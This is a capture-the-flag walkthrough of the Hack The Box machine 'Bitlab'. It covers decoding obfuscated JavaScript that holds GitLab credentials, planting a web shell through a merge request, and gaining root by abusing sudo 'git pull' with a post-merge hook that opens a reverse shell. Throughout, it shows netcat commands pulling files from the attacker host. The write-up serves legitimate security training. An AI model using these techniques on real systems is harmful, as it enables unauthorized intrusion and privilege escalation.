2020/01/05

# HTB Bitlab

## Part 1 :: Initial Enumeration
Let's start with our usual nmap scan.
```
$ nmap -sCSV -p 1-10000 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 15:11 AEDT
Nmap scan report for 10.10.10.114
Host is up (0.057s latency).
Not shown: 9998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing too interesting here, apart from the fact that the HTTP server is running Gitlab. Seems
like this might be another code-review box, nice. No obvious ways in, so let's fire up burpsuite
and see if its spider picks up anything interesting.

So after about 30 seconds of clicking on links we land on an interesting one. The "help" link leads
us to an open directory, with an interesting "bookmarks.html" file. Let's take a look.

## Part 2 :: Initial Foothold
Hmm, it just seems to be a bunch of links. However, while most of the links go to outside URLs, the
"Gitlab Login" link is interesting. It seems to be some poorly obfuscated javascript. So let's copy
this javascript, clean it up a little and see what we can extract from it.
```javascript
function() {
    var _0x4b18 = [
        "\x76\x61\x6C\x75\x65",
        "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E",
        "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
        "\x63\x6C\x61\x76\x65",
        "\x75\x73\x65\/x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64",
        "\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"
    ];

    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
```

So, the first thing that should jump out at you when looking at this should be the hex. Based on
the range of characters it looks like valid ascii. So let's get decoding. We'll should also rename
the array so it's a bit more readable, and take the variables out of the array in the `document`
statements at the bottom.
```javascript
function() {
    var arr = [
        "value",
        "user_login"
        "getElementById",
        "clave",
        "user_password",
        "11des0081x"
    ];

    document["getElementById"]("user_login")["value"] = "clave";
    document["getElementById"]("user_password")["value"] = "11des0081x";
}
```

Nice. It's pretty obvious this is some sort of hacky login script that this dude "clave" wrote.
Let's cut out all the crap so the javascript is readable (an unnecessary step, but indulge me).
```
function() {
    document.getElementById("user_login").value = "clave";
    document.getElementById("user_password").value = "11des0081x";
}
```

Awesome, now that we have some credentials we should use them. They're definitely for the gitlab
login page. Let's give them a go and see what we can see.

Okay, so it seems like "clave" has access to two repositories, "Profile" and "Deployer". Let's
give both of these a good read (commits, issues, pull requests, source code, etc) and see if we
can't find anything interesting. 

So "Profile" is completely uninteresting apart from the fact that it has "Auto DevOps" enabled.
"Deployer" is very interesting. It seems to be a git hook for the "Profile" repo. It looks like
whenever a successful merge request goes through on "Profile", the updated "Profile" repo is pulled
onto the server. So I think our first step should be finding where the profile page is located on
the server. What's the bet that it's just at "/profile"?

Yup, that worked. Let's see if can get a shell uploaded. It should be as simple as uploading the
shell to another branch on the "Profile" repo and submitting a merge request. Let's give this a go.

Shell successfully uploaded, merge request successful. Hopefully we should be able to see our shell
in the profile directory. Yup, there it is.
```
p0wny@shell:…/html/profile# whoami
www-data
```

## Part 3 :: Getting User & Root
Let's upload our enumeration script and see what we can find.
```
p0wny@shell:/tmp# nc 10.10.xx.xx 4444 > LinEnum.sh
```
```
$ nc -lv -p 4444 < LinEnum.sh
listening on [any] 4444 ...
connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
```
```
p0wny@shell:/tmp# sh LinEnum.sh

...

-e [-] Super user account(s):
root
-e

...

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull

...
```

Huh, so it seems we can use `git pull` as sudo. We can leverage this, but it'll be a little weird.
I hope you're familiar with git. I don't want to go into too much detail as to how this exploit works,
but I'll give you an overview.
 1. You need to create two repositories: one is the remote (the "master") repository, and one is the "local" repository.
 2. You set the remote of the "local" repo to be the "master" repo you created earlier.
 3. You make changes in both repos, so when you use `git pull`, a merge is forced. 
 4. You can create a file "local/.git/hooks/post-merge", that gets executed when you `git pull`.

In the example `payload.tar`, the script that gets executed is a reverse shell. You can look
throught the provided files to get a feel for it. 

We upload our payload to the server using netcat.
```
p0wny@shell:/tmp# nc 10.10.xx.xx 4444 > payload.tar
```
```
$ nc -lv -p 4444 < payload.tar
listening on [any] 4444 ...
connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
```

Next we unpack it and execute `sudo git pull`. Remember we have to have netcat running on our end
to receive the reverse shell.
```
p0wny@shell:/tmp# tar xf payload.tar
p0wny@shell:/tmp# cd payload/payload
p0wny@shell:…/payload/payload# sudo git pull
```
```
$ nc -lv -p 4444
listening on [any] 4444 ...
connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 59150
# /bin/bash
/bin/bash
root@bitlab:/tmp/payload/payload#
```

Awesome. Now we can get the root and user flags.
```
root@bitlab:/# cat /home/clave/user.txt
cat /home/clave/user.txt
1e3fd81ec3aa2f1462370ee3c20b8154
```
```
root@bitlab:/# cat /root/root.txt
cat /root/root.txt
8d4cc131757957cb68d9a0cddccd587c
```

## Part 4 :: Lessons Learned
 * Git hooks can be leveraged to gain privilege escalation / command execution.
 * Open directories can leak sensitive information.
 * Always enumerate for directories (dirbuster would have found both the profile page and the open help directory, we got lucky).

